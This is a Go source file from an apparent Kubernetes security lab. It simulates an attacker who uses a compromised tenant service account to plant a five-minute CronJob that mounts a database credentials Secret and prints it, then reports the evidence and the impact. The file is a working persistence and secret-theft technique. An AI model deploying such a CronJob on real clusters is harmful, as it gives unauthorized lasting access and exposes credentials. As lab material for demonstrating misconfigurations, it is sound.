package scenarios

import (
	"context"
	"fmt"
	"strings"
	"time"

	"k8s-security-lab/internal/cluster"

	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func CronJobAttack() error {
	fmt.Println("[*] Starting CronJob persistence scenario")

	namespace := "tenant-a"
	serviceAccountName := "tenant-sa"
	cronJobName := "persistence-cron"
	jobName := "persistence-cron-manual-run"

	adminClient, err := cluster.GetClient()
	if err != nil {
		return err
	}

	compromisedClient, err := cluster.GetServiceAccountClient(namespace, serviceAccountName)
	if err != nil {
		return err
	}

	err = adminClient.BatchV1().
		CronJobs(namespace).
		Delete(context.Background(), cronJobName, metav1.DeleteOptions{})
	if err != nil && !apierrors.IsNotFound(err) {
		return err
	}

	err = adminClient.BatchV1().
		Jobs(namespace).
		Delete(context.Background(), jobName, metav1.DeleteOptions{})
	if err != nil && !apierrors.IsNotFound(err) {
		return err
	}

	fmt.Printf("[*] Using compromised %s/%s identity to create a persistent CronJob\n", namespace, serviceAccountName)

	cronJob := &batchv1.CronJob{
		ObjectMeta: metav1.ObjectMeta{
			Name:      cronJobName,
			Namespace: namespace,
		},
		Spec: batchv1.CronJobSpec{
			Schedule: "*/5 * * * *",
			JobTemplate: batchv1.JobTemplateSpec{
				Spec: batchv1.JobSpec{
					Template: corev1.PodTemplateSpec{
						Spec: corev1.PodSpec{
							RestartPolicy: corev1.RestartPolicyNever,
							Containers: []corev1.Container{
								{
									Name:  "reenter",
									Image: "alpine",
									Command: []string{
										"/bin/sh",
										"-c",
										"echo persistence-established; echo username=$(cat /loot/username); echo password=$(cat /loot/password)",
									},
									VolumeMounts: []corev1.VolumeMount{
										{
											Name:      "db-credentials",
											MountPath: "/loot",
											ReadOnly:  true,
										},
									},
								},
							},
							Volumes: []corev1.Volume{
								{
									Name: "db-credentials",
									VolumeSource: corev1.VolumeSource{
										Secret: &corev1.SecretVolumeSource{
											SecretName: "db-credentials",
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	_, err = compromisedClient.BatchV1().
		CronJobs(namespace).
		Create(context.Background(), cronJob, metav1.CreateOptions{})
	if err != nil {
		fmt.Println("[!] CronJob creation failed")
		fmt.Println("\nEvidence:")
		fmt.Println(err)
		return err
	}

	fmt.Println("[+] CronJob created")
	fmt.Println("[*] Manually triggering one run to collect proof without waiting for the schedule")

	job := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{
			Name:      jobName,
			Namespace: namespace,
		},
		Spec: cronJob.Spec.JobTemplate.Spec,
	}

	_, err = adminClient.BatchV1().
		Jobs(namespace).
		Create(context.Background(), job, metav1.CreateOptions{})
	if err != nil {
		return err
	}

	jobPod, err := waitForJobPod(adminClient, namespace, jobName, 60*time.Second)
	if err != nil {
		return err
	}

	logs, err := getPodLogs(adminClient, namespace, jobPod.Name)
	if err != nil {
		return err
	}

	fmt.Println("\nEvidence:")
	fmt.Printf("CronJob schedule: %s\n", cronJob.Spec.Schedule)
	fmt.Println(strings.TrimSpace(logs))

	fmt.Println("\nImpact:")
	fmt.Println("- Attacker can establish persistence in the namespace")
	fmt.Println("- The malicious workload will continue to run on schedule")
	fmt.Println("- Periodic jobs can re-steal secrets or recreate access paths")

	return nil
}
